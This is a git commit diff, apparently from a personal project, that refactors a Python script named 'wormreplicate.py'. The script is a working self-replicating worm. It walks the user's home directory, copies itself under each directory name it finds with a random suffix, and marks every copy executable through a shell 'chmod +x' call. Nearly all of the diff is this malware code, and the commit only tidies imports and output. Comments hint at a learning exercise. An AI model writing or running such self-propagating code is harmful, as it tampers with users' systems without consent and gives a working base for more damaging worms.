bd2b93120036c54c4c37a389ce039829e06558a3
peytonrayne <51815710+peytonrayne@users.noreply.github.com>
2021-07-10 13:13:55 -0400

    Update wormreplicate.py

--- wormreplicate.py
+++ wormreplicate.py
@@ -1,28 +1,28 @@
 #!/usr/bin/env python3
 
-import os
+from os import path, system, walk
 from shutil import copyfile
-import getpass
-import random
+from getpass import getuser
+from random import random
 
 
 def get_file_info():
 
 	#get the name of the current iteration of the worm
-	filename = os.path.basename(__file__)
+	filename = path.basename(__file__)
 
 	#find the current location of the worm file
-	location = os.path.abspath(filename)
+	location = path.abspath(filename)
 
 	#get the username of Linux user to know the home folder location
-	user = getpass.getuser()
+	user = getuser()
 
 	return filename, location, user
 
 def replicate(filename, location, user, name):
 
 	#generate random string to differentiate files while testing
-	noise = str(random.random())
+	noise = str(random())
 
 	#set destination to the user's Documents folder
 	destination = "/home/"+user+"/"+name+"/"+"wormreplicate"+noise+".py"
@@ -30,7 +30,7 @@ def replicate(filename, location, user, name):
 	#Copies our file into the new location
 	copyfile(location,destination)
 	
-	print(f"The worm has been copied to {destination}.")
+	print("The worm has been copied.")
 	return destination
 
 def make_executable(destination):
@@ -39,12 +39,12 @@ def make_executable(destination):
 	cmd = "chmod +x" + " " + destination
 
 	#run the command
-	os.system(cmd)
+	system(cmd)
 	
 
 def main():
 	filename, location, user = get_file_info()
-	for root, dirs, files in os.walk("/home/"+user+"/"):
+	for root, dirs, files in walk("/home/"+user+"/"):
 			for name in dirs:
 				try:
 					destination = replicate(filename, location, user, name)
